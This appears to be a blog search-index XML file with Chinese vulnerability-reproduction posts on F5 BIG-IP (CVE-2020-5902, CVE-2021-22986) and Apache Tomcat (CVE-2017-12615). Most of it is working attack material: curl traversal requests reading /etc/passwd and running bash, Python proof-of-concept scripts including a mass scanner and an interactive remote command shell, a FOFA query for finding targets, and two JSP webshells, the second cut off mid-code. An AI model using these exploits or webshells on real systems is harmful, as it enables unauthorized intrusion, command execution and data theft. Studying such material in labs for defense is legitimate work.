<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>F5 BIG-IP 远程代码执行漏洞</title>
    <url>/2021/08/25/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 <code>F5 BIG-IP</code> 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIG-IP 15.x: 15.1.0/15.0.0</span><br><span class="line">BIG-IP 14.x: 14.1.0 ~ 14.1.2</span><br><span class="line">BIG-IP 13.x: 13.1.0 ~ 13.1.3</span><br><span class="line">BIG-IP 12.x: 12.1.0 ~ 12.1.5</span><br><span class="line">BIG-IP 11.x: 11.6.1 ~ 11.6.5</span><br></pre></td></tr></table></figure>

<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;-335242539&quot;</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在官网下载vmware文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&amp;pro=big-ip_v15.x&amp;ver=15.1.0&amp;container=Virtual-Edition</span><br></pre></td></tr></table></figure>

<p>直接访问会跳转，需要注册个账号。或者直接使用以下账户进行登陆。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F5登录账号：john12334@027168.com/John12334</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200911098.png" alt="image-20210826200911098"></p>
<p>登陆成功后，下载ova文件格式</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200932855.png" alt="image-20210826200932855"></p>
<p>导入Vmware:文件–&gt;打开–&gt;下一步导入虚拟机。导入后直接启动，使用系统默认账户：root/default登陆，随后修改默认密码。最后ifconfig。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200958844.png" alt="image-20210826200958844"></p>
<p>浏览器访问：<a href="https://192.168.240.147/tmui/login.jsp">https://192.168.240.147/tmui/login.jsp</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201104572.png" alt="image-20210826201104572"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="F5-BIG-IP-远程代码执行漏洞-CVE-2020-5902"><a href="#F5-BIG-IP-远程代码执行漏洞-CVE-2020-5902" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902"></a>F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902</h3><p><a href="https://github.com/jas502n/CVE-2020-5902">详情利用方式 https://github.com/jas502n/CVE-2020-5902</a></p>
<p><a href="https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md">详情利用方式 https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md</a></p>
<p>漏洞验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 浏览器中访问</span><br><span class="line">https://192.168.240.147/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201137886.png" alt="image-20210826201137886"></p>
<p>执行tmsh命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&quot;</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&quot;</span><br></pre></td></tr></table></figure>

<p>写入文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -X POST -d &quot;fileName=/tmp/success&amp;content=CVE-2020-5902&quot; &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp&quot;</span><br></pre></td></tr></table></figure>

<p>读取文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/success&quot;</span><br></pre></td></tr></table></figure>

<p>修改alias劫持list命令为bash；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash&quot;</span><br><span class="line"># 写入bash文件</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&amp;content=id&quot;</span><br><span class="line"># 执行bash文件</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test&quot;</span><br><span class="line"># 还原list命令</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&quot;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2020-5902漏洞POC"><a href="#CVE-2020-5902漏洞POC" class="headerlink" title="CVE-2020-5902漏洞POC"></a>CVE-2020-5902漏洞POC</h3><p>测试是否存在有此漏洞；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 拾玖的猫                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 拾玖的猫                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号 : 小拾玖的猫                                                     \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    version_url = target_url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)</span><br><span class="line">        if &quot;output&quot; in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 存在漏洞，响应为:\n&#123;&#125;\033[0m&quot;.format(target_url, json.loads(response.text)[&quot;output&quot;]))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标漏洞无法利用 \033[0m&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标漏洞无法利用 ,&#123;&#125;\033[0m&quot;.format(e))</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>

<h3 id="F5-BIG-IP-远程代码执行漏洞-CVE-2021-22986"><a href="#F5-BIG-IP-远程代码执行漏洞-CVE-2021-22986" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986"></a>F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986</h3><p>漏洞验证，访问如下页面。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201205590.png" alt="image-20210826201205590"></p>
<p>通过burp修改请求包；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:8443</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 41</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201222529.png" alt="image-20210826201222529"></p>
<p>成功执行命令id；</p>
<h3 id="CVE-2021-22986漏洞POC"><a href="#CVE-2021-22986漏洞POC" class="headerlink" title="CVE-2021-22986漏洞POC"></a>CVE-2021-22986漏洞POC</h3><p>1.批量测试漏洞IP站点POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 小拾玖的猫                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 小拾玖的猫                                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号  : 小拾玖的猫                                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2)</span><br><span class="line">        if &quot;commandResult&quot; in response.text and response.status_code == 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; \033[0m&quot;.format(target_url, json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;.format(target_url))</span><br><span class="line"></span><br><span class="line">def Scan(file_name):</span><br><span class="line">    with open(file_name, &quot;r&quot;, encoding=&#x27;utf8&#x27;) as scan_url:</span><br><span class="line">        for url in scan_url:</span><br><span class="line">            if url[:4] != &quot;http&quot;:</span><br><span class="line">                url = &quot;https://&quot; + url</span><br><span class="line">            url = url.strip(&#x27;\n&#x27;)</span><br><span class="line">            try:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;\033[31m[x] 请求报错 \033[0m&quot;.format(e))</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = str(input(&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p>2.命令执行POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 小拾玖的猫                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 小拾玖的猫                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号  : 小拾玖的猫                                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#x27;&#x27;&#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c &#x27;cat /etc/passwd&#x27;&quot;&#125;&#x27;&#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        if &#x27;root&#x27; in response.text and response.status_code == 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; \033[0m&quot;.format(target_url, json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">            while True:</span><br><span class="line">                Cmd = str(input(&quot;\033[35mCmd &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">                POC_2(target_url, Cmd)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, Cmd):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    Cmd = &quot;&#x27;&quot; + Cmd + &quot;&#x27;&quot;</span><br><span class="line">    data = &#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c %s&quot;&#125;&#x27; % Cmd</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        print(&quot;\033[32m&#123;&#125; \033[0m&quot;.format(json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 命令执行失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
  </entry>
  <entry>
    <title>Tomcat 任意上传漏洞(CVE-2017-12615)</title>
    <url>/2021/08/25/Tomcat%20%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(CVE-2017-12615)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
<p>2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Tomcat 7.0.0 - 7.0.81</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. docker搭建；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/tomcat/CVE-2017-12615</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问 <a href="http://xxx.xxx.xxx.xxx:8080/">http://xxx.xxx.xxx.xxx:8080/</a> 正常即可;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826203327824.png" alt="image-20210826203327824"></p>
<p><strong>2. windows搭建；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">windows 7/Java1.8.0/tomcat7.0.70</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/maoning/p/10701349.html">安装Java环境</a>;</p>
<p>安装tomcat环境;<a href="https://github.com/apache/tomcat/releases">tomcat历史版本下载</a></p>
<p>进入apache-tomcat-7.0.70\bin文件并新起cmd执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure>

<p><a href="https://gblfy.blog.csdn.net/article/details/90493722">报错解决</a>：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826203910827.png" alt="image-20210826203910827"></p>
<p>在setclasspath.bat（Linux为setclasspath.sh,并将set改为export）的开头手动添加环境变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set JAVA_HOME=C:\Program Files (x86)\Java\bin</span><br><span class="line">set JRE_HOME=C:\Program Files (x86)\Java\jre</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204131112.png" alt="image-20210826204131112"></p>
<p>保存后再次cmd执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204220268.png" alt="image-20210826204220268"></p>
<p>环境启动成功。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞产生的主要原因来自于<strong>conf/web.xml</strong>文件配置错误,readonly开启了false,导致可以使用<strong>PUT/DELETE</strong>请求方法操作文件；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204703445.png" alt="image-20210826204703445"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>浏览器打开<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204406230.png" alt="image-20210826204406230"></p>
<p>浏览器中刷新一下页面，brup中将会捕获到流量；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204431390.png" alt="image-20210826204431390"></p>
<p>使用PUT请求方式写入hacker.jsp webshell，如下图操作；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204445757.png" alt="image-20210826204445757"></p>
<p>hacker.jsp如下；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;safedog&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>Response中返回HTTP/1.1 201 Created，说明文件创建成功。</p>
<p>浏览器访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.40.137:8080/hacker.jsp?pwd=safedog&amp;cmd=ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204538095.png" alt="image-20210826204538095"></p>
<h3 id="漏洞验证脚本"><a href="#漏洞验证脚本" class="headerlink" title="漏洞验证脚本"></a>漏洞验证脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ianxtianxt/CVE-2017-12615</span><br></pre></td></tr></table></figure>



<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>（需使用菜刀链接）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /webshell.jsp/ HTTP/1.1  </span><br><span class="line">Host: 127.0.0.1:8080  </span><br><span class="line">Content-Length: 6239  </span><br><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">  String Pwd = &quot;hetian&quot;;  </span><br><span class="line">  String cs = &quot;UTF-8&quot;;  </span><br><span class="line">   String EC(String s) throws Exception &#123;  </span><br><span class="line">       return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);  </span><br><span class="line">   &#125;  </span><br><span class="line">   Connection GC(String s) throws Exception &#123;  </span><br><span class="line">       String[] x = s.trim().split(&quot;choraheiheihei&quot;);  </span><br><span class="line">     Class.forName(x[0].trim());  </span><br><span class="line">      if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1)&#123;  </span><br><span class="line">          return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);  </span><br><span class="line">      &#125;else&#123;  </span><br><span class="line">          Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);  </span><br><span class="line">        if (x.length &gt; 4) &#123;  </span><br><span class="line">              c.setCatalog(x[4]);  </span><br><span class="line">          &#125;  </span><br><span class="line">          return c;  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">  void AA(StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      File k = new File(&quot;&quot;);  </span><br><span class="line">      File r[] = k.listRoots();  </span><br><span class="line">       for (int i = 0; i &lt; r.length; i++) &#123;  </span><br><span class="line">         sb.append(r[i].toString().substring(0, 2));  </span><br><span class="line">     &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">   void BB(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">       File oF = new File(s), l[] = oF.listFiles();  </span><br><span class="line">     String sT, sQ, sF = &quot;&quot;;  </span><br><span class="line">        java.util.Date dt;  </span><br><span class="line">      SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);  </span><br><span class="line">     for (int i = 0; i &lt; l.length; i++) &#123;  </span><br><span class="line">          dt = new java.util.Date(l[i].lastModified());  </span><br><span class="line">           sT = fm.format(dt);  </span><br><span class="line">           sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;  </span><br><span class="line">           sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;  </span><br><span class="line">           if (l[i].isDirectory()) &#123;  </span><br><span class="line">               sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()+ &quot;\t&quot; + sQ + &quot;\n&quot;);  </span><br><span class="line">          &#125; else &#123;  </span><br><span class="line">               sF+=l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;+ sQ + &quot;\n&quot;;  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">       sb.append(sF);  </span><br><span class="line">   &#125;  </span><br><span class="line">   void EE(String s) throws Exception &#123;  </span><br><span class="line">       File f = new File(s);  </span><br><span class="line">      if (f.isDirectory()) &#123;  </span><br><span class="line">           File x[] = f.listFiles();  </span><br><span class="line">           for (int k = 0; k &lt; x.length; k++) &#123;  </span><br><span class="line">               if (!x[k].delete()) &#123;  </span><br><span class="line">                  EE(x[k].getPath());  </span><br><span class="line">               &#125;  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">      f.delete();  </span><br><span class="line">&#125;  </span><br><span class="line">  void FF(String s, HttpServletResponse r) throws Exception &#123;  </span><br><span class="line">       int n;  </span><br><span class="line">     byte[] b = new byte[512];  </span><br><span class="line">     r.reset();  </span><br><span class="line">     ServletOutputStream os = r.getOutputStream();  </span><br><span class="line">       BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));  </span><br><span class="line">       os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);  </span><br><span class="line">      while ((n = is.read(b, 0, 512)) != -1) &#123;  </span><br><span class="line">           os.write(b, 0, n);  </span><br><span class="line">     &#125;  </span><br><span class="line">   os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);  </span><br><span class="line">       os.close();  </span><br><span class="line">     is.close();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void GG(String s, String d) throws Exception &#123;  </span><br><span class="line">     String h = &quot;0123456789ABCDEF&quot;;  </span><br><span class="line">      File f = new File(s);  </span><br><span class="line">      f.createNewFile();  </span><br><span class="line">     FileOutputStream os = new FileOutputStream(f);  </span><br><span class="line">      for (int i = 0; i &lt; d.length(); i += 2) &#123;  </span><br><span class="line">        os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i + 1))));  